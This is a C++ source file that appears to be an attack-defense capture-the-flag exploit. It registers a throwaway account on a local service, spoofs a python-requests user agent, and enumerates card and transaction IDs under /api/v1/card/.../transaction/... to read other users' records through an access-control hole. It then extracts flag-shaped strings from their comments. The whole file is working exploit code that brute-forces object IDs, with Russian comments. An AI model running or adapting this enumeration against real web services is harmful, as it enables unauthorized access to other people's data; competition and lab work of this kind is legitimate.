#include <iostream>
#include <fstream>
#include <string>
#include <optional>
#include <regex>

#include <future>
#include <filesystem>
#include  <memory>
#include <random>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <set>
#include <iomanip>
#include <vector>
#include <stdexcept>
#include <chrono>
using namespace std::chrono;

using namespace std;
using json = nlohmann::json;

#define REQUEST_TIMEOUT 25
#define FIRST_NAME "Judy"
#define SECOND_NAME "Hopps"
#define DEFAULT_PORT 8888
#define  MAX_CID 500
#define  MAX_TID 500
#define  IP "127.0.1.1:8888"
#define SCRIPT_TIMEOUT 25

class State{
private:
    int cid = 0;
    int tid = 0;
public:
    State(int cid, int tid) {
        this->cid = cid;
        this->tid = tid;
    }

    static int save_json(const string& filename, int cid, int tid) {
        json data;
        data["cid"] = cid;
        data["tid"] = tid;

        ofstream file(filename);

        if (file.is_open()) {
            file << setw(4) << data << endl;
            file.close();
            cout << "JSON file saved successfully" << endl;
        } else {
            cerr << "could not open file for writing! " << endl;
            return 0;
        }

        return 1;

    }

    static int load_json(const string& filename, int& cid, int& tid) {
        json data;
        ifstream file(filename);


        if (!file.is_open()) {
            cerr << "could not open file for reading! Created new file" << endl;
            cid=0;
            tid=0;
            return save_json(filename, cid, tid);
        }

        try {
            data = json::parse(file);

            cid = data["cid"];
            tid = data["tid"];

        }catch (json::parse_error& e) {
            cerr << "Json parse error: " << e.what() << endl;
            cid = 0;
            tid = 0;
        }

        return 1;
    }

};

class HTTPSession {
private:
    CURL* curl;
    curl_slist* headers;
    string pending_token;
public:
    HTTPSession() {
        curl = curl_easy_init();
        if (!curl) {
            throw runtime_error("curl_easy_init_failed");
        }

        headers = nullptr;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, "Connection: keep-alive");

        curl_easy_setopt(curl, CURLOPT_TIMEOUT, REQUEST_TIMEOUT);
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "python-requests/2.25.1");
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookies.txt"); // сохранять куки в файл
        curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, header_callback);
        curl_easy_setopt(curl, CURLOPT_HEADERDATA, this);

    }

    ~HTTPSession() {
        if (headers) {
            curl_slist_free_all(headers);
        }
        if (curl) {
            curl_easy_cleanup(curl);
        }

    }

    HTTPSession(const HTTPSession&) = delete;
    HTTPSession& operator=(const HTTPSession&) = delete;

    static size_t write_callback(char * ptr, size_t size, size_t nmemb, void * userdata) {
        auto * response = static_cast<string*>(userdata);
        response->append(ptr, size * nmemb);
        return size * nmemb;

    }

    static size_t header_callback(char *buffer, size_t size, size_t nitems, void *userdata) {
        auto *session = static_cast<HTTPSession*>(userdata);
        string line(buffer, size * nitems);
        if (line.find("Set-Cookie: token=") == 0) {
            // Извлекаем token=... до первого ';'
            size_t start = line.find('=') + 1;
            size_t end = line.find(';', start);
            string token = line.substr(start, end - start);
            session->pending_token = token;
        }
        return size * nitems;
    }

    optional<string> post_json(const string& url, const json& body) {
        string response;
        string body_str = body.dump();

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body_str.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body_str.size());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body_str.size());

        // Говорим curl: когда придет ответ, вызывай write_callback
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response); // сюда ответ

        CURLcode request = curl_easy_perform(curl);


        if (request != CURLE_OK) {
            cerr << "error in POST request: " << curl_easy_strerror(request) << endl;
            return nullopt;
        }

        long response_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        //cout << "POST " << url << " → " << response_code << endl;



        if (response_code != 200) {
            return nullopt;
        }

        if (!pending_token.empty()) {
            string cookie = "token=" + pending_token;
            curl_easy_setopt(curl, CURLOPT_COOKIE, cookie.c_str());
            pending_token.clear();
        }
        return response;


    }

    optional<json> get_json(const string& url) {
        string response;


        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curl, CURLOPT_POST, 0L);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 0L);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 0L);
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, nullptr);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0L);

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);


        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);


        CURLcode request = curl_easy_perform(curl);

        if (request != CURLE_OK) {
            cerr << "error in GET request: " << curl_easy_strerror(request) << endl;
            return nullopt;
        }

        long response_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        //cout << "GET " << url << " → " << response_code << endl;

        if (response_code != 200 || response.empty()) {
            return nullopt;
        }
        try {
            json body = json::parse(response);
            return body;
        } catch (json::parse_error& e) {
            cerr << "JSON parse error: " << e.what() << endl;
            return nullopt;
        }

    }
};


string generate_random_str(size_t n=24) {
    static const string alphabet =
            "abcdefghijklmnopqrstuvwxyz"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    static random_device rd;
    static mt19937 gen(rd());
    static uniform_int_distribution<size_t> dist(0, alphabet.size() - 1);

    string result;
    result.reserve(n);

    for (size_t i=0; i < n; i++) {
        result += alphabet[dist(gen)];
    }
    return result;
}

string normalize(string url) {
    string host_port;
    string host;
    int port = DEFAULT_PORT;
    int host_start;
    int host_end;
    int port_start;
    string port_str;

    if (url.find("http://") == string::npos) {
        url = "http://" + url;
    }
    int scheme_pos = url.find("://");
    host_start = scheme_pos + 3;
    host_end = url.find_first_of("/?#",host_start);

    if (host_end == string::npos) {
        host_port = url.substr(host_start);
    }else {
        host_port = url.substr(host_start, host_end - host_start);

    }

    port_start = host_port.find(":");
    if (port_start == string::npos) {
        host  = host_port;
    }else {
        host = host_port.substr(0, port_start);
        port_str = host_port.substr(port_start+1);

        if (!port_str.empty()) {
            port = stoi(port_str);
        }
    }
    return "http://" + host + ":" + to_string(port);
}

unique_ptr<HTTPSession> register_or_login(const string& base_url) {
    auto session = make_unique<HTTPSession>();

    string login = generate_random_str();
    string password = generate_random_str();

    json register_body = {
        {"login", login},
    {"password", password},
    {"first_name", FIRST_NAME},
    {"second_name", SECOND_NAME},
    };

    auto register_response = session->post_json(base_url + "/api/v1/register", register_body);

    if (!register_response.has_value()) {
        cerr << "[!] register failed " << endl;
        return nullptr;
    }
    cout << "registered" << endl;
    json login_body = {
        {"login", login},
    {"password", password},
    };



    auto login_response = session->post_json(base_url + "/api/v1/login", login_body);

    if (!login_response.has_value()) {
        cerr << "[!] login failed " << endl;
        return nullptr;
    }

    cout << "logged in" << endl;

    return session;
}

optional<json> fetch(string base_url, HTTPSession& session, int cid, int tid, string &url) {

    string address = base_url + "/api/v1/card/"
        + to_string(cid) + "/transaction/" + to_string(tid);
    auto response = session.get_json(address);
    url = address;
    if (!response.has_value()) {
        //cerr << "[!] fetch failed " << endl;
        return nullopt;
    }

    return response;
}

void emit(const string& comment, set<string>& printed, string &url, int& flags_counter) {
    vector<regex> FLAG_PATTERNS = {
        regex(R"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})", regex_constants::icase),
        regex(R"([A-Z0-9]{31}=)")
    };

    for (const auto& pattern: FLAG_PATTERNS) {
        auto begin = sregex_iterator(comment.begin(), comment.end(), pattern);
        auto end = sregex_iterator();
        string hit;
        for (auto it = begin; it != end; it++) {
            hit = it->str();
            if (printed.find(hit) != printed.end()) continue;
            printed.insert(hit);
            //cout << url << endl;
            cout << hit << endl;
            flags_counter++;
        }
    }
}

int main() {
    auto start_time = steady_clock::now();
    const int timeout_sec = SCRIPT_TIMEOUT;

    string base = normalize(IP);
    unique_ptr<HTTPSession> session = register_or_login(base);

    if (!session) {
        cerr << "Could not register/login" << endl;
        return 1;
    }

    int last_cid = 0, last_tid = 0;
    State state(last_cid, last_tid);
    state.load_json("data.json", last_cid, last_tid);

    int cid = last_cid;
    int tid = last_tid;
    optional<json> resp;
    json body;
    set<string> printed;
    bool timeout = false;
    int flags_count = 0;
    for (; cid < MAX_CID; ++cid) {
        for (tid = 0; tid < MAX_TID; ++tid) {
            // Проверка времени (после каждого запроса)
            if (duration_cast<seconds>(steady_clock::now() - start_time).count() >= timeout_sec) {
                timeout = true;
                break;
            }
            string url;
            resp = fetch(base, *session, cid, tid, url);
            if (resp.has_value()) {
                body = resp.value();
                if (body.contains("comment") && body["comment"].is_string()) {
                    string comment = body["comment"].get<string>();
                    emit(comment, printed, url, flags_count);

                }
            }
        }
        if (timeout) break;
    }

    state.save_json("data.json", cid, tid);
    cout << "Собрано флагов за раунд: " << flags_count << endl;
    return 0;
}